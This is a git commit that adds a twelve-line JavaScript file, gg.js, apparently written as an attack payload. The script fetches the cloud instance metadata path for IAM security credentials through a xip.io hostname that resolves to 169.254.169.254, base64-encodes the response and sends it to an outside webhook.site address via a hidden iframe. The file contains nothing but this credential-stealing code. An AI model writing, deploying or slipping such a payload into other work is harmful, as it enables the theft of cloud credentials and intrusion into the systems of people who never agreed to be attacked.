42b3856afff7b8a1ddd5971219d3b3f219ceb6d3
mhmh55516 <mhmh55516@gmail.com>
2021-04-28 00:01:12 +0200

    Create gg.js

---
+++ gg.js
@@ -0,0 +1,12 @@
+function reqListener () {
+    var encoded = encodeURI(this.responseText);
+    var b64 = btoa(this.responseText);
+    var iframe = document.createElement('iframe');
+	iframe.style.display = "none";
+	iframe.src = "http://webhook.site/95008403-a846-494a-8d4c-70aa6246bcdb/?aa="+b64;
+	document.body.appendChild(iframe);
+} 
+var oReq = new XMLHttpRequest(); 
+oReq.addEventListener("load", reqListener); 
+oReq.open("GET", "http://169.254.169.254.xip.io/latest/meta-data/iam/security-credentials/"); 
+oReq.send();
